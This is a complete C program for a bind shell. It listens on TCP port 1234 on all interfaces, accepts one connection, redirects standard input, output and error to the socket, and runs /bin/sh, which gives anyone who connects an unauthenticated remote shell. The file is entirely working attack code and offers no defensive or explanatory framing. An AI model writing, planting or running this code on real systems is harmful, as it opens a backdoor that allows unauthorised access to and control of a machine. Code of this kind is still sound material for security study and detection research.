#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

/* Server Listen Port */
#define PORT 1234

void start_bind() {
	struct sockaddr_in addr;
	int addrlen = sizeof(addr);
	int sockfd;
	int opt = 1;
	
	char *argv[] = { "sh", NULL };

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0)
		exit(1);

	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int)) < 0)
		exit(1);

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(PORT);

	if (bind(sockfd, (struct sockaddr*) &addr, addrlen) < 0)
		exit(1);

	if (listen(sockfd, 3) < 0)
		exit(1);

	int connection = accept(sockfd, (struct sockaddr*) &addr, (socklen_t*) &addrlen);
	if (connection < 0) {
		printf("o no connection bad\n");
		exit(1);
	}

	if (dup2(connection, 0) < 0) exit(1); // dupe to stdin
	if (dup2(connection, 1) < 0) exit(1); // dupe to stdout
	if (dup2(connection, 2) < 0) exit(1);
	// if (close(connection) < 0) exit(1);

	execve("/bin/sh", 0, 0);

	close(connection);
	shutdown(sockfd, SHUT_RDWR);
}

int main(int argc, char **argv) {
		start_bind();
		return 0;
}
